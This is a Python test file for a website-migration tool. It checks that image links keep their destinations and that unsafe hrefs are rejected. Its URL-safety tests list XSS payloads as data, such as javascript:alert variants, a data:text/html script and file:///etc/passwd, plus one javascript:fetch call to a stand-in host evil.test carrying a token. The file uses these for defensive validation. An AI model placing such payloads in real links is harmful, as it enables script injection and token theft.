"""Native linked-image retention: URL safety, wrapper mechanics, and the
source-neutral planner/composer path that carries a retained image
destination from a Design Document through to a real clickable component.

See docs/agency-image-link-retention-contract.md for the contract this file
maintains coverage for, and artifacts/test_image_link_retention_independent.py
for the root-owned acceptance this implementation must also satisfy.
"""

from __future__ import annotations

from copy import deepcopy
from datetime import UTC, datetime
from pathlib import Path

import pytest

from vanjaro_cli.design.global_plan import split_global_sections
from vanjaro_cli.design.html_adapter import design_document_from_html
from vanjaro_cli.design.models import (
    Alignment,
    AssetRecord,
    ContentElement,
    ContentKind,
    DesignAnalysis,
    DesignDocument,
    DesignSource,
    DesignTokens,
    LayoutKind,
    LayoutObservation,
    MediaPosition,
    NavigationVisibility,
    Page,
    RepeatGroup,
    RepeatGroupItem,
    RepeatGroupKind,
    Section,
    SourceKind,
    StyleSet,
)
from vanjaro_cli.design.planner import (
    PlanningError,
    bind_section,
    emit_library_plan,
    plan_design_document,
    validate_composition_plan,
)
from vanjaro_cli.design.template_catalog import load_template_catalog
from vanjaro_cli.migration.url_rewrite import build_page_lookup, rewrite_tree
from vanjaro_cli.utils.block_compose import apply_overrides, check_overflow, find_template
from vanjaro_cli.utils.image_links import (
    ImageLinkError,
    apply_image_link,
    collect_component_ids,
    is_image_link_wrapper,
    is_safe_link_href,
    validate_link_href,
)

ROOT = Path(__file__).resolve().parents[1]
CATALOG = load_template_catalog(ROOT / "artifacts" / "block-templates")


def _entry(filename: str):
    return next(entry for entry in CATALOG if Path(entry.relative_path).name == filename)


# ---------------------------------------------------------------------------
# Generic tree helpers (independent of the root acceptance file's copies)
# ---------------------------------------------------------------------------


def _walk(node, ancestors=()):
    yield node, ancestors
    for child in node.get("components", []):
        yield from _walk(child, ancestors + (node,))


def _find_image(tree: dict, src: str):
    return next((n, a) for n, a in _walk(tree) if n.get("type") == "image"
                and n.get("attributes", {}).get("src") == src)


def _link_owner(ancestors: tuple[dict, ...]) -> dict | None:
    links = [a for a in ancestors if a.get("type") == "link" and a.get("tagName", "a") == "a"]
    return links[0] if links else None


def _all_ids(tree: dict) -> list[str | None]:
    return [n.get("attributes", {}).get("id") for n, _ in _walk(tree)]


# ---------------------------------------------------------------------------
# URL safety: is_safe_link_href / validate_link_href
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("href", [
    "/relative/path",
    "relative/path.html",
    "?query=only",
    "#fragment-only",
    "/path?x=1#y",
    "http://example.com/page",
    "https://example.com/page?x=1",
    "mailto:hello@example.com",
    "tel:+15551234567",
    "//cdn.example.com/protocol-relative.jpg",
])
def test_safe_hrefs_are_accepted(href: str) -> None:
    assert is_safe_link_href(href) is True
    assert validate_link_href(href) == href


@pytest.mark.parametrize("href", [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "JaVaScRiPt:alert(1)",
    "\tjavascript:alert(1)",
    "\njavascript:alert(1)",
    "\x00javascript:alert(1)",
    "\x1fjavascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "ftp://example.com/file",
    "chrome-extension://abc/page.html",
])
def test_unsafe_or_unsupported_hrefs_are_rejected(href: str) -> None:
    assert is_safe_link_href(href) is False
    with pytest.raises(ImageLinkError):
        validate_link_href(href)


def test_unsafe_href_error_never_echoes_the_rejected_url() -> None:
    secret = "javascript:fetch('https://evil.test/steal?token=super-secret-value')"
    with pytest.raises(ImageLinkError) as excinfo:
        validate_link_href(secret)
    assert "super-secret-value" not in str(excinfo.value)
    assert "evil.test" not in str(excinfo.value)


@pytest.mark.parametrize("blank", [None, "", "   "])
def test_blank_href_validates_to_empty_string_clear_signal(blank) -> None:
    assert validate_link_href(blank) == ""


def test_ImageLinkError_is_a_value_error() -> None:
    assert issubclass(ImageLinkError, ValueError)


# ---------------------------------------------------------------------------
# apply_overrides / image_links wrapper mechanics
# ---------------------------------------------------------------------------


def test_new_wrapper_carries_only_contract_shape() -> None:
    template = find_template("Gallery (3-up)")
    result = apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": "/dest"})
    image, ancestors = _find_image(result["template"], "/a.jpg")
    link = _link_owner(ancestors)
    assert link is not None
    assert link["type"] == "link"
    assert link["tagName"] == "a"
    assert {"name": "vj-link", "active": False} in link["classes"]
    assert link["attributes"]["href"] == "/dest"
    assert link["attributes"]["id"]
    assert link["components"] == [image]
    assert "href" not in image["attributes"]


def test_unlinked_image_is_untouched_when_key_absent() -> None:
    template = find_template("Gallery (3-up)")
    before = deepcopy(template)
    result = apply_overrides(template, {"image_1_src": "/a.jpg"})
    image, ancestors = _find_image(result["template"], "/a.jpg")
    assert _link_owner(ancestors) is None
    assert "href" not in image["attributes"]
    assert template == before


def test_apply_overrides_does_not_mutate_input_template() -> None:
    template = find_template("Gallery (3-up)")
    before = deepcopy(template)
    apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": "/dest"})
    assert template == before


def test_clearing_href_unwraps_without_deleting_the_image() -> None:
    template = find_template("Gallery (3-up)")
    linked = apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": "/dest"})
    cleared = apply_overrides(linked, {"image_1_href": ""})
    image, ancestors = _find_image(cleared["template"], "/a.jpg")
    assert _link_owner(ancestors) is None
    assert image["attributes"]["src"] == "/a.jpg"


def test_clearing_an_already_unlinked_image_is_a_no_op() -> None:
    template = find_template("Gallery (3-up)")
    result = apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": ""})
    image, ancestors = _find_image(result["template"], "/a.jpg")
    assert _link_owner(ancestors) is None


def test_reusing_an_existing_bare_wrapper_updates_href_in_place() -> None:
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    parent = ancestors[-1]
    index = next(i for i, child in enumerate(parent["components"]) if child is image)
    parent["components"][index] = {
        "type": "link", "tagName": "a",
        "classes": [{"name": "vj-link", "active": False}],
        "attributes": {"id": "authored-image-link", "href": "/old-dest"},
        "components": [image],
    }
    result = apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": "/new-dest"})
    image_out, ancestors_out = _find_image(result["template"], "/a.jpg")
    link = _link_owner(ancestors_out)
    assert link["attributes"]["id"] == "authored-image-link"
    assert link["attributes"]["href"] == "/new-dest"
    # exactly one owner -- reuse, not a nested second anchor
    assert len([a for a in ancestors_out if a.get("type") == "link"]) == 1


@pytest.mark.parametrize("wrap_type", ["link", "button"])
def test_card_level_wrapper_is_ambiguous_ownership(wrap_type: str) -> None:
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    column = ancestors[-1]
    heading = next(c for c in column["components"] if c.get("type") == "heading")
    wrapper = {
        "type": wrap_type, "tagName": "a",
        "classes": [{"name": "vj-link" if wrap_type == "link" else "btn", "active": False}],
        "attributes": {"id": "whole-card-link", "href": "/card-target", **(
            {"role": "button"} if wrap_type == "button" else {}
        )},
        "components": [image, heading],
    }
    column["components"] = [wrapper] + [c for c in column["components"] if c is not heading and c is not image]

    with pytest.raises(ValueError):
        apply_overrides(template, {"image_1_href": "/unrelated"})

    # Clearing an ambiguous ownership is a safe no-op, not an error.
    cleared = apply_overrides(template, {"image_1_href": ""})
    node = next(n for n, _ in _walk(cleared["template"]) if n.get("attributes", {}).get("id") == "whole-card-link")
    assert node["attributes"]["href"] == "/card-target"


def test_button_single_image_owner_is_ambiguous_not_reused() -> None:
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    parent = ancestors[-1]
    index = next(i for i, child in enumerate(parent["components"]) if child is image)
    parent["components"][index] = {
        "type": "button", "tagName": "a",
        "classes": [{"name": "btn", "active": False}],
        "attributes": {"id": "img-button", "role": "button", "href": "/button-target"},
        "components": [image],
    }
    with pytest.raises(ValueError):
        apply_overrides(template, {"image_1_href": "/unrelated"})


@pytest.mark.parametrize("href", [
    "javascript:alert(1)",
    "\x01javascript:alert(1)",
    "data:text/html,x",
])
def test_apply_overrides_raises_valueerror_for_unsafe_direct_override(href: str) -> None:
    with pytest.raises(ValueError):
        apply_overrides(find_template("Gallery (3-up)"), {"image_1_href": href})


def test_wrapper_ids_are_unique_and_deterministic_across_multiple_images() -> None:
    overrides = {
        "image_1_src": "/a.jpg", "image_1_href": "/one",
        "image_2_src": "/b.jpg", "image_2_href": "/two",
        "image_3_src": "/c.jpg", "image_3_href": "/three",
    }
    template = find_template("Gallery (3-up)")
    first = apply_overrides(template, overrides)
    second = apply_overrides(template, overrides)
    ids = _all_ids(first["template"])
    assert all(ids) and len(ids) == len(set(ids))
    assert first == second


def test_wrapper_id_collision_resolves_deterministically_with_two_prior_collisions() -> None:
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    base_id = image["attributes"]["id"] + "-link"
    ancestors[-1]["components"].extend([
        {"type": "text", "content": "x", "classes": [{"name": "vj-text", "active": False},
                                                       {"name": "paragraph-style-1", "active": False}],
         "attributes": {"id": base_id}},
        {"type": "text", "content": "y", "classes": [{"name": "vj-text", "active": False},
                                                       {"name": "paragraph-style-1", "active": False}],
         "attributes": {"id": f"{base_id}-2"}},
    ])
    overrides = {"image_1_src": "/a.jpg", "image_1_href": "/dest"}
    result = apply_overrides(template, overrides)
    ids = _all_ids(result["template"])
    assert len(ids) == len(set(ids))
    link = _link_owner(_find_image(result["template"], "/a.jpg")[1])
    assert link["attributes"]["id"] == f"{base_id}-3"
    assert result == apply_overrides(template, overrides)


def test_repeated_composition_does_not_multiply_wrappers_or_shift_other_slots() -> None:
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    ancestors[-1]["components"].append({
        "type": "link", "tagName": "a", "content": "Read the brief",
        "classes": [{"name": "vj-link", "active": False}],
        "attributes": {"id": "mixed-nav-link", "href": "/brief"},
    })
    overrides = {
        "image_1_src": "/a.jpg", "image_1_href": "/photo",
        "link_1": "Read the brief updated", "link_1_href": "/brief-updated",
    }
    first = apply_overrides(template, overrides)
    second = apply_overrides(first, overrides)
    third = apply_overrides(second, overrides)
    for composed in (first, second, third):
        image_out, ancestors_out = _find_image(composed["template"], "/a.jpg")
        links = [a for a in ancestors_out if a.get("type") == "link"]
        assert len(links) == 1
        assert links[0]["attributes"]["href"] == "/photo"
        nav = next(n for n, _ in _walk(composed["template"]) if n.get("attributes", {}).get("id") == "mixed-nav-link")
        assert nav["content"] == "Read the brief updated"
        assert nav["attributes"]["href"] == "/brief-updated"
    assert first == second == third


def test_generated_image_link_wrapper_never_consumes_a_link_n_slot() -> None:
    """A wrapper this code generates for an image's destination never becomes
    addressable as ``link_N``/``link_N_href`` -- not on the pass that creates
    it, and not on any later pass. It sits where the image used to be, ahead
    of any link appended after it in document order; renumbering strictly by
    position (or by content shape, which an authored content-free wrapper can
    share -- see the root acceptance's authored-owner test) would let it eat
    the next real link's slot on every subsequent ``apply_overrides`` call.
    Only a link matching the deterministic generated-id pattern is excluded,
    so the wrapper here must stay unaddressable while the real, authored
    ``second-link`` keeps a stable ``link_1`` identity across repeated
    composition.
    """
    template = find_template("Gallery (3-up)")
    image, ancestors = next((n, a) for n, a in _walk(template["template"]) if n.get("type") == "image")
    ancestors[-1]["components"].append({
        "type": "link", "tagName": "a", "content": "Second link",
        "classes": [{"name": "vj-link", "active": False}],
        "attributes": {"id": "second-link", "href": "/second"},
    })
    first = apply_overrides(template, {"image_1_src": "/a.jpg", "image_1_href": "/photo"})

    overrides = {
        "image_1_src": "/a.jpg", "image_1_href": "/photo",
        "link_1": "Second updated", "link_1_href": "/second-updated",
    }
    second = apply_overrides(first, overrides)
    image_out, ancestors_out = _find_image(second["template"], "/a.jpg")
    owner = _link_owner(ancestors_out)
    assert owner["attributes"]["href"] == "/photo"
    assert owner.get("content") in (None, "")
    updated = next(n for n, _ in _walk(second["template"]) if n.get("attributes", {}).get("id") == "second-link")
    assert updated["content"] == "Second updated"
    assert updated["attributes"]["href"] == "/second-updated"


def test_missing_media_index_does_not_shift_later_destinations() -> None:
    result = apply_overrides(find_template("Gallery (3-up)"), {
        "image_1_src": "", "image_1_href": "",
        "image_2_src": "/b.jpg", "image_2_href": "/projects/b",
        "image_3_src": "/c.jpg", "image_3_href": "/projects/c",
    })
    image_b, ancestors_b = _find_image(result["template"], "/b.jpg")
    image_c, ancestors_c = _find_image(result["template"], "/c.jpg")
    assert _link_owner(ancestors_b)["attributes"]["href"] == "/projects/b"
    assert _link_owner(ancestors_c)["attributes"]["href"] == "/projects/c"


def test_expanded_repeat_beyond_template_default_can_still_carry_a_destination() -> None:
    overrides = {f"image_{i}_src": f"/img-{i}.jpg" for i in range(1, 6)}
    overrides.update({f"image_{i}_href": f"/dest-{i}" for i in range(1, 6)})
    template = find_template("Gallery (3-up)")
    assert check_overflow(template, overrides) == []
    result = apply_overrides(template, overrides)
    ids = _all_ids(result["template"])
    assert len(ids) == len(set(ids)) and all(ids)
    for i in range(1, 6):
        image, ancestors = _find_image(result["template"], f"/img-{i}.jpg")
        assert _link_owner(ancestors)["attributes"]["href"] == f"/dest-{i}"


def test_nonexistent_image_href_does_not_conjure_a_placeholder_image() -> None:
    template = find_template("Gallery (3-up)")
    overrides = {"image_9_href": "/nowhere"}
    assert check_overflow(template, overrides) == ["image_9_href"]
    result = apply_overrides(template, overrides)
    # Exactly the template's own 3 images -- nothing manufactured.
    images = [n for n, _ in _walk(result["template"]) if n.get("type") == "image"]
    assert len(images) == 3


def test_check_overflow_empty_when_href_pairs_an_existing_image() -> None:
    template = find_template("Gallery (3-up)")
    overrides = {"image_1_src": "/a.jpg", "image_1_href": "/dest"}
    assert check_overflow(template, overrides) == []


# ---------------------------------------------------------------------------
# is_image_link_wrapper / collect_component_ids unit coverage
# ---------------------------------------------------------------------------


def test_is_image_link_wrapper_requires_single_image_child_and_no_content() -> None:
    image = {"type": "image", "attributes": {"id": "img-1"}}
    bare_wrapper = {"type": "link", "components": [image]}
    labeled_wrapper = {"type": "link", "content": "Click here", "components": [image]}
    multi_child_wrapper = {"type": "link", "components": [image, {"type": "text", "content": "x"}]}

    assert is_image_link_wrapper(bare_wrapper) is True
    assert is_image_link_wrapper(labeled_wrapper) is False
    assert is_image_link_wrapper(multi_child_wrapper) is False
    assert is_image_link_wrapper(image) is False
    assert is_image_link_wrapper({"type": "button", "components": [image]}) is False


def test_collect_component_ids_walks_the_whole_tree() -> None:
    tree = {
        "type": "section", "attributes": {"id": "s1"},
        "components": [
            {"type": "column", "attributes": {"id": "c1"}, "components": [
                {"type": "image", "attributes": {"id": "i1"}},
            ]},
        ],
    }
    assert collect_component_ids(tree) == {"s1", "c1", "i1"}


def test_apply_image_link_adds_new_id_to_shared_existing_ids_set() -> None:
    image = {"type": "image", "attributes": {"id": "img-shared"}}
    parent = {"type": "column", "attributes": {"id": "col"}, "components": [image]}
    existing = {"img-shared", "col"}
    apply_image_link(image, parent, [parent], "/dest", existing)
    assert "img-shared-link" in existing
    link = parent["components"][0]
    assert link["attributes"]["id"] == "img-shared-link"
    assert link["attributes"]["href"] == "/dest"


# ---------------------------------------------------------------------------
# Source-neutral ContentElement coverage (no HTML adapter involved)
# ---------------------------------------------------------------------------


def _gallery_group_section(
    *,
    section_id: str = "work.gallery",
    hrefs: dict[int, str | None] | None = None,
    include_media: tuple[bool, ...] = (True, True, True),
) -> Section:
    """A gallery-shaped section built straight from ContentElement/RepeatGroup.

    ``hrefs`` maps a 0-based item index to the href its image should carry
    (``None`` means no href attribute at all). ``include_media`` controls
    whether item N even has a media element, to exercise a missing-item case
    without going through any source adapter.
    """
    hrefs = hrefs or {}
    content: list[ContentElement] = [
        ContentElement(
            id="title", kind=ContentKind.HEADING, role="section_title",
            value="Selected Work", order=0, provenance=[], confidence=1.0,
        )
    ]
    items: list[RepeatGroupItem] = []
    for index, has_media in enumerate(include_media):
        fields: dict[str, str] = {}
        if has_media:
            attributes = {}
            if index in hrefs and hrefs[index] is not None:
                attributes["href"] = hrefs[index]
            image = ContentElement(
                id=f"image-{index}", kind=ContentKind.IMAGE, role="media",
                value=f"assets/work-{index}.jpg",
                attributes=attributes, order=index + 1, provenance=[], confidence=1.0,
            )
            content.append(image)
            fields["media"] = image.id
        items.append(RepeatGroupItem(id=f"item-{index}", fields=fields))
    return Section(
        id=section_id, order=0, semantic_role="gallery", role_confidence=1.0,
        candidate_roles=[],
        layout=LayoutObservation(
            kind=LayoutKind.GRID, contained=True, columns=3,
            media_position=MediaPosition.TOP, alignment=Alignment.LEFT,
        ),
        content=content,
        groups=[RepeatGroup(id="gallery-items", kind=RepeatGroupKind.GALLERY_ITEM, items=items)],
        style=StyleSet(), responsive=[], decorative_layers=[], interactions=[], provenance=[],
    )


def _document(section: Section) -> DesignDocument:
    return DesignDocument(
        schema_version="1.0",
        source=DesignSource(
            kind=SourceKind.FIGMA, identifier="figma://source-neutral-test",
            captured_at=datetime(2026, 7, 16, tzinfo=UTC), adapter_version="1.0",
        ),
        tokens=DesignTokens(), assets=[],
        pages=[Page(
            id="home", source_reference="figma://source-neutral-test", title="Home", slug="",
            sections=[section], breakpoints=[], navigation_visibility=NavigationVisibility.VISIBLE,
            provenance=[],
        )],
        warnings=[], analysis=DesignAnalysis(section_confidence_mean=1.0, unsupported_traits=[]),
    )


def test_source_neutral_image_href_binds_as_paired_slot_without_html() -> None:
    """A retained href on an image evidenced by any adapter -- not just HTML -- pairs with its src."""
    section = _gallery_group_section(hrefs={0: "/projects/zero", 1: None, 2: "/projects/two"})
    bindings = bind_section(section, _entry("gallery-3up.json"))
    by_field = {
        (binding.item_id, binding.semantic_field): binding for binding in bindings
    }
    assert by_field[("item-0", "item.media.href")].slot == "image_1_href"
    assert by_field[("item-0", "item.media.href")].value == "/projects/zero"
    assert by_field[("item-0", "item.media.href")].source_element_ids == ("image-0",)
    assert ("item-1", "item.media.href") not in by_field
    assert by_field[("item-2", "item.media.href")].slot == "image_3_href"
    assert by_field[("item-2", "item.media.href")].value == "/projects/two"


def test_missing_first_item_media_does_not_shift_second_items_href() -> None:
    """item.media is optional on feature cards, so a first item with no image at
    all is a legitimate case -- unlike gallery-3up, where media is required."""
    content: list[ContentElement] = []
    items: list[RepeatGroupItem] = []
    for index, has_media in enumerate((False, True, True)):
        title = ContentElement(
            id=f"title-{index}", kind=ContentKind.HEADING, role="card_title",
            value=f"Card {index}", order=index * 2, provenance=[], confidence=1.0,
        )
        content.append(title)
        fields = {"title": title.id}
        if has_media:
            image = ContentElement(
                id=f"image-{index}", kind=ContentKind.IMAGE, role="media",
                value=f"assets/card-{index}.jpg",
                attributes={"href": f"/projects/{index}"} if index == 1 else {},
                order=index * 2 + 1, provenance=[], confidence=1.0,
            )
            content.append(image)
            fields["media"] = image.id
        items.append(RepeatGroupItem(id=f"item-{index}", fields=fields))
    section = Section(
        id="work.features", order=0, semantic_role="feature_cards", role_confidence=1.0,
        candidate_roles=[],
        layout=LayoutObservation(
            kind=LayoutKind.GRID, contained=True, columns=3,
            media_position=MediaPosition.TOP, alignment=Alignment.LEFT,
        ),
        content=content,
        groups=[RepeatGroup(id="cards", kind=RepeatGroupKind.CARD, items=items)],
        style=StyleSet(), responsive=[], decorative_layers=[], interactions=[], provenance=[],
    )

    bindings = bind_section(section, _entry("feature-cards-3up.json"))
    by_field = {(binding.item_id, binding.semantic_field): binding for binding in bindings}
    assert ("item-0", "item.media") not in by_field
    href_binding = by_field[("item-1", "item.media.href")]
    # item-0's absent media still reserves image_1 so item-1 does not slide
    # into its visual slot; item-1's own media and href land on image_2.
    assert href_binding.slot == "image_2_href"
    assert href_binding.value == "/projects/1"
    assert ("item-2", "item.media.href") not in by_field


def test_unsafe_source_href_becomes_an_actionable_planning_issue_not_a_silent_bind() -> None:
    section = _gallery_group_section(hrefs={0: "javascript:alert('leak-token-abc')"})
    # Direct bind_section: an unsafe destination is an actionable planning
    # failure, the same shape as any other unmet/unsafe field -- it is not
    # quietly downgraded to "bind the image, drop the link".
    with pytest.raises(PlanningError, match=r"unsafe"):
        bind_section(section, _entry("gallery-3up.json"))

    document = _document(section)
    plan = plan_design_document(document, catalog=CATALOG)
    assert plan.entries[0].match.blocking
    diagnostic = " ".join(plan.entries[0].warnings).lower()
    assert any(term in diagnostic for term in ("destination", "href", "url", "link"))
    assert "leak-token-abc" not in diagnostic
    assert emit_library_plan(plan) == []


def test_no_href_image_binds_only_src_and_alt() -> None:
    section = _gallery_group_section(hrefs={0: None})
    bindings = bind_section(section, _entry("gallery-3up.json"))
    fields = {b.semantic_field for b in bindings if b.item_id == "item-0"}
    assert "item.media" in fields
    assert "item.media.href" not in fields


def test_background_only_slot_blocks_rather_than_silently_dropping_destination() -> None:
    section = Section(
        id="hero.centered", order=0, semantic_role="hero", role_confidence=1.0,
        candidate_roles=[],
        layout=LayoutObservation(kind=LayoutKind.STACK, contained=True),
        content=[
            ContentElement(
                id="title", kind=ContentKind.HEADING, role="title",
                value="Come see the studio", order=0, provenance=[], confidence=1.0,
            ),
            ContentElement(
                id="bg", kind=ContentKind.IMAGE, role="background_media",
                value="assets/hero-bg.jpg",
                attributes={"href": "/studio-tour"},
                order=1, provenance=[], confidence=1.0,
            ),
        ],
        groups=[], style=StyleSet(), responsive=[], decorative_layers=[], interactions=[],
        provenance=[],
    )
    with pytest.raises(PlanningError, match=r"background image"):
        bind_section(section, _entry("centered-hero.json"))

    document = _document(section)
    plan = plan_design_document(document, catalog=CATALOG)
    assert plan.entries[0].match.blocking
    assert emit_library_plan(plan) == []


def test_background_image_without_href_is_not_blocked() -> None:
    section = Section(
        id="hero.centered", order=0, semantic_role="hero", role_confidence=1.0,
        candidate_roles=[],
        layout=LayoutObservation(kind=LayoutKind.STACK, contained=True),
        content=[
            ContentElement(
                id="title", kind=ContentKind.HEADING, role="title",
                value="Come see the studio", order=0, provenance=[], confidence=1.0,
            ),
            ContentElement(
                id="bg", kind=ContentKind.IMAGE, role="background_media",
                value="assets/hero-bg.jpg",
                order=1, provenance=[], confidence=1.0,
            ),
        ],
        groups=[], style=StyleSet(), responsive=[], decorative_layers=[], interactions=[],
        provenance=[],
    )
    bindings = bind_section(section, _entry("centered-hero.json"))
    assert any(b.slot == "background_image" for b in bindings)


def test_validate_composition_plan_accepts_image_href_on_expanded_repeat_slot() -> None:
    section = _gallery_group_section(
        hrefs={0: "/one", 1: "/two", 2: "/three"},
        include_media=(True, True, True, True),
    )
    plan = plan_design_document(_document(section), catalog=CATALOG)
    assert validate_composition_plan(plan) == ()


# ---------------------------------------------------------------------------
# Real adapter -> split_global_sections -> planner -> emit_library_plan ->
# apply_overrides, for a gallery layout and a second, distinct generic
# listing layout (feature cards). Exact destination-to-image ancestry is
# checked, not just a URL set somewhere in the composed JSON.
# ---------------------------------------------------------------------------


def _adapter_document(html: str, assets_prefix: str):
    document = design_document_from_html(
        html, "https://agency.example/index",
        captured_at=datetime(2026, 1, 1, tzinfo=UTC),
    )
    return document.model_copy(update={"assets": [
        asset.model_copy(update={"local_path": f"assets/{assets_prefix}-{i}.jpg"})
        for i, asset in enumerate(document.assets)
    ]})


def test_gallery_layout_real_adapter_chain_preserves_exact_ancestry() -> None:
    cards = "".join(
        f'<article class="portfolio-item"><a href="/case-studies/item-{i}">'
        f'<img src="/media/item-{i}.jpg" alt="Case study {i}"></a>'
        f"<h3>Case Study {i}</h3><p>Summary</p></article>"
        for i in range(3)
    )
    html = (
        '<html><body><header class="site-header"><nav><a href="/">Home</a>'
        '<a href="/work">Work</a></nav></header><section id="dnn_content">'
        '<div id="dnn_GalleryPane" class="Pane"><h2>Case Studies</h2>' + cards
        + '</div></section><footer class="site-footer"><p>Copyright 2026.</p>'
        "</footer></body></html>"
    )
    document = _adapter_document(html, "case")
    body_document, _globals, global_issues = split_global_sections(document)
    assert not global_issues
    plan = plan_design_document(body_document, catalog=CATALOG)
    assert not validate_composition_plan(plan)
    entry = next(e for e in plan.entries if e.template_id == "Cards/gallery-3up")
    assert not entry.match.blocking

    library = next(e for e in emit_library_plan(plan) if e["key"] == entry.source_section_id)
    result = apply_overrides(find_template(library["template"]), library["overrides"])

    assets = {asset.id: asset.local_path for asset in document.assets}
    section = next(s for p in document.pages for s in p.sections if s.id == entry.source_section_id)
    linked = [e for e in section.content if e.kind.value == "image" and e.attributes.get("href")]
    assert len(linked) == 3
    for element in linked:
        image, ancestors = _find_image(result["template"], assets[element.asset_id])
        owner = _link_owner(ancestors)
        assert owner is not None
        assert owner["attributes"]["href"] == element.attributes["href"]
        assert owner["attributes"]["id"]
        assert {"name": "vj-link", "active": False} in owner["classes"]
        assert "href" not in image["attributes"]


def test_feature_card_layout_real_adapter_chain_preserves_exact_ancestry() -> None:
    """A second, structurally distinct generic listing layout: feature cards, not gallery."""
    cards = "".join(
        f'<article class="service-item"><a href="/services/svc-{i}">'
        f'<img src="/images/svc-{i}.jpg" alt="Service {i}"></a>'
        f"<h3>Service {i}</h3><p>Description of service {i}.</p>"
        f'<a class="btn" href="/services/svc-{i}">Learn more</a></article>'
        for i in range(3)
    )
    html = (
        '<html><body><header class="site-header"><nav><a href="/">Home</a>'
        '<a href="/services">Services</a></nav></header><section id="dnn_content">'
        '<div id="dnn_ServicesPane" class="Pane"><h2>Our Services</h2>' + cards
        + '</div></section><footer class="site-footer"><p>Copyright 2026.</p>'
        "</footer></body></html>"
    )
    document = _adapter_document(html, "svc")
    body_document, _globals, global_issues = split_global_sections(document)
    assert not global_issues
    plan = plan_design_document(body_document, catalog=CATALOG)
    assert not validate_composition_plan(plan)
    entry = next(e for e in plan.entries if e.template_id == "Cards/feature-cards-3up")
    assert not entry.match.blocking

    library = next(e for e in emit_library_plan(plan) if e["key"] == entry.source_section_id)
    result = apply_overrides(find_template(library["template"]), library["overrides"])

    assets = {asset.id: asset.local_path for asset in document.assets}
    section = next(s for p in document.pages for s in p.sections if s.id == entry.source_section_id)
    linked = [e for e in section.content if e.kind.value == "image" and e.attributes.get("href")]
    assert len(linked) == 3
    for element in linked:
        image, ancestors = _find_image(result["template"], assets[element.asset_id])
        owner = _link_owner(ancestors)
        assert owner is not None
        assert owner["attributes"]["href"] == element.attributes["href"]
        assert "href" not in image["attributes"]


# ---------------------------------------------------------------------------
# Generated native links pass the existing URL rewrite traversal unchanged.
# ---------------------------------------------------------------------------


def test_generated_image_link_is_rewritten_by_existing_url_traversal() -> None:
    result = apply_overrides(
        find_template("Gallery (3-up)"),
        {"image_1_src": "/a.jpg", "image_1_href": "/projects/legacy-slug"},
    )
    page_lookup = build_page_lookup({"/projects/legacy-slug": "/work/new-slug"})
    report = rewrite_tree(result["template"], {}, page_lookup)
    assert report.links_rewritten == 1

    _, ancestors = _find_image(result["template"], "/a.jpg")
    owner = _link_owner(ancestors)
    assert owner["attributes"]["href"] == "/work/new-slug"
